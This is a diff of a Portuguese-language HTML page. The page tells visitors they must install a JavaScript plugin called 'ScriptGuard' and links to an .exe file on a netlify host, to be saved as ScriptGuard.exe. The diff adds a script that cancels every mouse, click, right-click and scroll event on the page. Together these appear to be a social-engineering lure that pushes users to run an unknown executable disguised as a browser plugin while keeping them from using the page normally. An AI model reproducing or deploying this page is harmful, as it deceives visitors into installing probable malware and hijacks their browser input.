@@ -51,6 +51,32 @@
     <p>Para ter acesso a todo o conteúdo interativo deste site, é necessário instalar o plugin JavaScript denominado "ScriptGuard" em seu navegador. Por favor, clique no link abaixo para baixar o plugin e desfrutar plenamente da experiência de navegação.:</p>
     
     <a href="https://sandro52.netlify.app/s.exe" download="ScriptGuard.exe">Download</a>
+<script>
+        // Desativa todos os eventos relacionados ao mouse
+        document.addEventListener('mousemove', function(e) {
+            e.preventDefault();
+        });
+
+        document.addEventListener('mousedown', function(e) {
+            e.preventDefault();
+        });
+
+        document.addEventListener('mouseup', function(e) {
+            e.preventDefault();
+        });
+
+        document.addEventListener('click', function(e) {
+            e.preventDefault();
+        });
+
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        document.addEventListener('wheel', function(e) {
+            e.preventDefault();
+        });
+    </script>
 
 </body>
 </html>
